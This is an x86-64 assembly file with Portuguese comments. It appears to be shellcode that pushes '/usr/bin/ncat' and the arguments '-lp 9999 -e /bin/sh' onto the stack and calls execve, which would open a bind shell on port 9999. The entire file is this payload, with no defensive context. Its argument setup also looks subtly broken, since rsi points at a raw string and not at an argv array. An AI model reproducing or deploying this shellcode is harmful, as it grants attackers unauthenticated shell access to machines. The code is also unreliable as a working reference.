global _start:

_start:
	xor rdi, rdi;zera o rdi
	xor rsi, rsi ;zera o rsi
	xor rax, rax ;zera o rax
	push rdi ; stack = 0 0 
	pop rdx ; rdx = 0 | stack = NULL
	
	mov rax, 0x68732f4141414141 ; move hs/ no rax
	shr rax, 0x28 ;insere null byte no primeiro A
	push rax

	mov rax, 0x6e69622f20652d20 ;move nib/ -e rax
	push rax

	mov rax, 0x3939393920706c2d ;move 9999 pl-
	push rax
	
	push rsp ;puxa o endereco da string na stack

	pop rsi ;guarda o endereco do argumento no rsi

	mov rdi, 0x7461636e2f414141 ; move At no registro rdi
	shr rdi, 0x18
	push rdi; move rdi no stack | stack = 0xAAAAAAAt
	mov rdi, 0x6e69622f7273752f ; move acn/nib/ no registro rdi
	push rdi ; empurra endereco do rdi na stack | stack = 0xAAAAAAAAt, 0xacn/nib/ 
	push rsp ; puxa stack pointer pra stack

	pop rdi ; pega o ponteiro do stack pointer (o comeco da string)
	push 0x3b
	pop rax
	syscall
